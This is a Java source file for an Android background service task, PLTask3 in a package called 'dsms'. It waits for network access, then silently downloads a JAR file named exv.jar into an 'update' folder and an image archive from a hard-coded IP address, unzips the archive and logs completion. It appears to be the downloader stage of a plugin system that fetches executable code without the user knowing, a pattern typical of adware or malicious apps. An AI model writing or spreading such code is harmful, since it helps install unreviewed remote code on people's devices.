/**
 * 
 */
package com.acying.dsms;



/**
 * exit
 * @author Keel
 *
 */
public class PLTask3 implements DSTask {

	private DServ dserv;
	private int id = 3;
	private int state = STATE_WAITING;
	private String TAG = "dserv-PLTask"+id;
	
	@Override
	public void run() {
		DSms.log(dserv.getService(), TAG, "==========PLTask id:"+this.id+"===========");
		dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+id+"_task running");
		state = STATE_RUNNING;
		while (true) {
			if (!StringUtil.isNetOk(this.dserv.getService())) {
				try {
					Thread.sleep(1000*60*5);
				} catch (InterruptedException e) {
				}
				continue;
			}
			
			
			//下载图片zip包,jar包
			
			
			String remote = "http://120.24.64.185:12370/dsms/dats/pics_2.zip";
			String localFile = dserv.getLocalPath()+"pics/pics_2.zip";
			String remoteJar = "http://120.24.64.185:12370/dsms/dats/exv.jar";
			String localJarDir = dserv.getLocalPath()+"update/";
			boolean isFinish = false;
			if (dserv.downloadGoOn(remoteJar, localJarDir, "exv.jar", this.dserv.getService())) {
				DSms.log(dserv.getService(), TAG, "down jar OK:"+localJarDir+"exv.jar");
				
				if(dserv.downloadGoOn(remote, dserv.getLocalPath()+"pics", "pics_2.zip",this.dserv.getService())){
					DSms.log(dserv.getService(),TAG, "down zip OK:"+localFile);
					boolean unzip = dserv.unzip(localFile, dserv.getLocalPath()+"pics/");
					if (unzip) {
						DSms.log(dserv.getService(), TAG, "unzip OK:"+localFile);
					}
					
//					this.dserv.setEmp("cn.play.dserv.MoreView", "update/emv2");
					isFinish = true;
//					Log.d(TAG, "update mvClass:"+this.dserv.getEmvClass()+" emvPath:"+this.dserv.getEmvPath());
//					state = STATE_DIE;
//					File f = new File(this.dserv.getLocalPath()+this.id+".dat");
//					if (f != null && f.exists()) {
//						f.delete();
//					}
				}
			}
			if (!isFinish) {
				state = STATE_WAITING;
			}else{
				this.dserv.taskDone(this);
				DSms.sLog(this.dserv.getService(), 101, "_@@"+this.id+"@@1@@done"); //1为type,表示任务已执行
				state = STATE_DIE;
			}
			break;
		}
		dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+id+"_task is finished.");
		DSms.log(dserv.getService(), TAG, "==========PLTask finished id:"+this.id+"===========");
		
	}
	/*public boolean isConnOk() {
		ConnectivityManager cm = (ConnectivityManager) dserv.getService().getSystemService(Context.CONNECTIVITY_SERVICE);
		boolean isOk = false;
		if (cm != null) {
			NetworkInfo aActiveInfo = cm.getActiveNetworkInfo();
			if (aActiveInfo != null && aActiveInfo.isAvailable()) {
				if (aActiveInfo.getState().equals(NetworkInfo.State.CONNECTED)) {
					isOk = true;
				}
			}
		}
		return isOk;
	}*/

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#getId()
	 */
	@Override
	public int getId() {
		return id;
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#getState()
	 */
	@Override
	public int getState() {
		return this.state;
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#init()
	 */
	@Override
	public void init() {
		DSms.log(dserv.getService(),TAG, "TASK "+id+" init.");
		
//		Log.d(TAG, "TASK "+id+" init.");
		if (dserv.getService() != null) {
			dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+id+"_task inited.");
		}else{
			DSms.log(dserv.getService(),TAG, "TASK "+id+" getService is null.");
		}
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#setState(int)
	 */
	@Override
	public void setState(int arg0) {
		this.state = arg0;
	}

	@Override
	public void setDService(DServ serv) {
		this.dserv =serv;
	}
}
